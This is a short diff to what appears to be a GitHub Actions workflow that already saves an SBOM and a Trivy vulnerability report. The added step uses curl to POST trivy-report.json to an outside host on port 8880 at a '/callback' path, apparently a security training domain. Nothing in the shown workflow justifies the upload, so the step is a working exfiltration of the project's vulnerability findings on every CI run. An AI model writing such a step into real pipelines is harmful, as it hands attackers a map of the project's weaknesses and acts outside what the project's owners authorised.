@@ -33,3 +33,7 @@ jobs:
           path: |
             sbom.json
             trivy-report.json
+
+      - name: Send Trivy report to external server
+        run: |
+          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@trivy-report.json" https://3c3mlrxujhc34pbr3dqv7.appsecengineer.training:8880/callback
